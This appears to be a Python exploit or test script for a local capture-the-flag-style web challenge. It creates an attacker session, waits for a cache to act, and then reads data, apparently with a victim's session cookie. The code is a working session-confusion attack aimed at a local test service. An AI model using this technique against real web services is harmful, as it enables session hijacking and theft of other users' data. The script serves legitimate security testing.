import requests
import sys
import json
import time
import random

BASE = "http://127.0.0.1:9090"
#BASE = "http://localhost:5000"
COOKIE_NAME = "session"
FLAG = "FLAG{TESTVAL}"

proxies = {
	"http": "http://localhost:8080"
}
#proxies = None
def create(session, mission, short):
	r = session.post(
		f"{BASE}/api/create",
		json = {
			"name": mission,
			"short": short
		}, proxies = proxies)
	return r.json()["secret"]

def login(session, mission, secret):
	r = session.post(
		f"{BASE}/api/authenticate",
		json = {
			"mission": mission,
			"secret": secret
		}, proxies = proxies)

def logout(session):
	session.get(
		f"{BASE}/api/logout"
		, proxies = proxies)

def get_missioninfo(session, mission):
	session.get(
		f"{BASE}/api/missioninfo/{mission}"
		, proxies = proxies)

def get_missionlist(session):
	return session.get(
		f"{BASE}/api/missions"
	, proxies = proxies).json()

def add_data(session, data):
	session.post(
		f"{BASE}/api/add_data",
		json = {
			"data": data
		}, proxies = proxies)

def get_data(session, secret = None):
	j = {}
	if secret != None:
		j["secret"] = secret
	return session.post(
		f"{BASE}/api/get_data"
		, json = j
		, proxies = proxies)

# Sessions
s_attack = requests.Session()

# Attacker logs in, get cookie
name = "imgstester" + str(random.randint(1, 1000))
pwd = create(s_attack, name, "nodesc")
login(s_attack, name, pwd)

get_missioninfo(s_attack, name)
#assert s_attack.cookies[COOKIE_NAME] == cookie_attack # this fails when the test is run the second time before the cache expired

print("Sleeping..")
time.sleep(5)

# Verify data in attacker
data = get_data(s_attack, pwd) # get_data, but the s_attack session now has the s_victim cookie
logout(s_attack)
print(data.content)

